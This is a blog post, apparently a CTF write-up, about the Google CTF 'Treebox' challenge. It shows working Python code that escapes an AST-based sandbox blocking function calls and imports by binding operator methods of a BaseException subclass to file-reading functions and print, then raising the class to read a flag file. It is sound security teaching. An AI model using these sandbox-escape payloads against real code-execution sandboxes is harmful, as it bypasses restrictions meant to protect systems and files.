<!doctype html><html lang=en-us><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><title>Treebox - lavafroth</title><meta name=description content='This challenge asks for python code as an input, converts it into an AST (abstract syntax tree) and if there aren&rsquo;t any function calls or imports, executes the code. Our goal here is to avoid explicitly calling any functions yet reading the flag located at flag. We also can&rsquo;t import any modules explicitly. If we read the source code provided for the challenge, we can observe that the sys module is already imported. We can piggyback on this fact to use its modules.'><meta name=author content><link rel="preload stylesheet" as=style href=https://lavafroth.is-a.dev/app.min.css><link rel=preload as=image href=../../header.svg><link as=font href=https://lavafroth.is-a.dev/latinmodern-math.otf><link rel=preload as=image href=https://lavafroth.is-a.dev/github.svg><link rel=preload as=image href=https://lavafroth.is-a.dev/about.svg><link rel=preload as=image href=https://lavafroth.is-a.dev/art.svg><link rel=icon href=https://lavafroth.is-a.dev/favicon.png><link rel=blog-icon href=https://lavafroth.is-a.dev/icon.png></head><body data-menu=true><header class=header><h1><a class=site-name href=https://lavafroth.is-a.dev/><svg viewBox="0 0 8790 2400"><path d="M80 1935V465h216v1270h286v2e2zm853 0 222-1470h264l222 1470h-210l-40-3e2h-208l-40 3e2zm280-528h148l-62-494-6-78h-12l-6 78zm1025 528L2014 465h210l108 868 8 142h12l8-142 108-868h210l-224 1470zm813 0 222-1470h264l222 1470h-210l-40-3e2h-208l-40 3e2zm280-528h148l-62-494-6-78h-12l-6 78zm851 528V465h514v222h-298v386h2e2v222h-2e2v640zm910 0V465h216q194 0 286 108 92 107 92 316 0 124-43 215-44 90-106 132l147 699h-216l-122-620h-38v620zm216-820q60 0 95-26 35-27 50-76t15-116q0-105-34-161-35-57-126-57zm1084 836q-90 0-154-42-65-42-99-114-35-72-35-162V767q0-91 35-162 34-72 99-114 64-42 154-42t155 42q64 42 99 114 34 72 34 162v866q0 90-34 162-35 72-99 114-65 42-155 42zm0-210q40 0 56-33 16-34 16-75V767q0-41-17-74-17-34-55-34-37 0-54 34-18 33-18 74v866q0 41 17 75 17 33 55 33zm890 194V687h-204V465h624v222h-204v1248zm828 0V465h216v608h168V465h216v1470h-216v-640h-168v640z"/></svg></a></h1><div class=push></div><a style=--url:url(./github.svg) href=https://github.com/lavafroth aria-label=github target=_blank></a><a href=../../about/ aria-label=about style=--url:url(./about.svg)></a><a href=../../art/ aria-label=art style=--url:url(./art.svg)></a></header><main class=main><article class=post-single><header class=post-title><p><time>Aug 19, 2022 | 2 minutes read</time></p><h1 data-pagefind-meta=title>Treebox</h1></header><section class=post-content data-pagefind-body><p>This challenge asks for python code as an input, converts it into an AST (abstract syntax tree) and if there aren&rsquo;t any function calls or imports, executes the code. Our goal here is to avoid explicitly calling any functions yet reading the flag located at <code>flag</code>. We also can&rsquo;t import any modules explicitly. If we read the source code provided for the challenge, we can observe that the <code>sys</code> module is already imported. We can piggyback on this fact to use its modules.</p><p>We shall, however, first find all the modules in <code>sys.modules</code> that have a <code>get_data</code> like function in their <code>__loader__</code> attribute. To do so, we run the following locally:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> sys
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> name, handle <span style=color:#f92672>in</span> sys<span style=color:#f92672>.</span>modules<span style=color:#f92672>.</span>items():
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> loader <span style=color:#f92672>:=</span> getattr(handle, <span style=color:#e6db74>&#39;__loader__&#39;</span>):
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span> loader_function_name <span style=color:#f92672>in</span> dir(loader):
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> <span style=color:#e6db74>&#39;get_data&#39;</span> <span style=color:#f92672>in</span> loader_function_name:
</span></span><span style=display:flex><span>                print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;sys.modules[&#39;</span><span style=color:#e6db74>{</span>name<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;].__loader__.</span><span style=color:#e6db74>{</span>loader_function_name<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span></code></pre></div><p>There are a lot of modules that have the <code>get_data</code> From the output we get, this looks the most promising:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>sys<span style=color:#f92672>.</span>modules[<span style=color:#e6db74>&#34;code&#34;</span>]<span style=color:#f92672>.</span>__loader__<span style=color:#f92672>.</span>get_data
</span></span></code></pre></div><p>Now we can slowly assemble our exploit.</p><div class=collapsable-explanation><div class=container><div class=rule></div><label><input type=checkbox> Collapse explanation</label></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> sys
</span></span></code></pre></div><p>We create a class called <code>Read</code> that inherits from the <code>BaseException</code> class.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Read</span>(<span style=color:#a6e22e>BaseException</span>):
</span></span></code></pre></div><p>We define the members of the class as the following:</p><p>Set the addition operator to the <code>str</code> function to stringify bytes-like
objects.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>    <span style=color:#a6e22e>__add__</span> <span style=color:#f92672>=</span> str
</span></span></code></pre></div><p>Set the division operator to os.loader.get_data method
which can be used to read the raw bytes from a file.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>    <span style=color:#a6e22e>__truediv__</span> <span style=color:#f92672>=</span> sys<span style=color:#f92672>.</span>modules[<span style=color:#e6db74>&#34;code&#34;</span>]<span style=color:#f92672>.</span>__loader__<span style=color:#f92672>.</span>get_data
</span></span></code></pre></div><p>Set the indexing operator to print, which we&rsquo;ll use to print the flag</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>    <span style=color:#a6e22e>__getitem__</span> <span style=color:#f92672>=</span> print
</span></span></code></pre></div><p>Now we need to detonate these operators without calling a function.
The best way is to define an <code>__init__</code> constructor method that is called implicitly when the
class is created.</p><p>Through this, we read the raw bytes of the file &ldquo;flag&rdquo; stringify it and finally print it.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>__init__</span>(self):
</span></span><span style=display:flex><span>        self[self <span style=color:#f92672>+</span> self <span style=color:#f92672>/</span> <span style=color:#e6db74>&#34;flag&#34;</span>]
</span></span></code></pre></div><p>With all of that setup out of the way, we can instantiate the class by raising it as an exception.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#66d9ef>raise</span> Read
</span></span></code></pre></div><div class=container><div class=rule></div></div></div><h3 id=update-2025-09-15>Update: 2025-09-15</h3><p>I was lurking through my past writeups, here&rsquo;s an ever easier way to achieve the same file read
without importing the <code>sys</code> module.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Read</span>(<span style=color:#a6e22e>BaseException</span>):
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>__add__</span> <span style=color:#f92672>=</span> list
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>__truediv__</span> <span style=color:#f92672>=</span> open
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>__getitem__</span> <span style=color:#f92672>=</span> print
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>__init__</span>(self):
</span></span><span style=display:flex><span>        self[self <span style=color:#f92672>+</span> self <span style=color:#f92672>/</span> <span style=color:#e6db74>&#34;flag&#34;</span>]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>raise</span> Read
</span></span></code></pre></div></section></article><footer class=post-tags data-pagefind-meta=tags><a href=https://lavafroth.is-a.dev/tags/google-ctf class=list-tag>Google CTF</a>
<a href=https://lavafroth.is-a.dev/tags/ctf class=list-tag>CTF</a>
<a href=https://lavafroth.is-a.dev/tags/python class=list-tag>Python</a>
<a href=https://lavafroth.is-a.dev/tags/ast class=list-tag>AST</a>
<a href=https://lavafroth.is-a.dev/tags/sandbox-escape class=list-tag>Sandbox Escape</a></footer><nav class=post-nav><a class=prev href=https://lavafroth.is-a.dev/post/picoctf-cryptography-pixelated/><span>←</span><span>Pixelated</span></a>
<a class=next href=https://lavafroth.is-a.dev/post/r0-i-saw-a-little-elf/><span>I Saw a Little Elf</span><span>→</span></a></nav></main><footer class=footer><p>&copy; 2025 <a href=https://lavafroth.is-a.dev/>lavafroth</a></p><p><a href=https://github.com/lavafroth/lavafroth.github.io/issues/new/choose>Report an issue</a></p><p><a href=https://github.com/lavafroth/lavafroth.github.io/discussions/>Discuss</a></p><p><a href=https://lavafroth.is-a.dev/privacy>Privacy</a></p><p><a href=https://creativecommons.org/licenses/by-sa/4.0/legalcode>License</a></p></footer></body></html>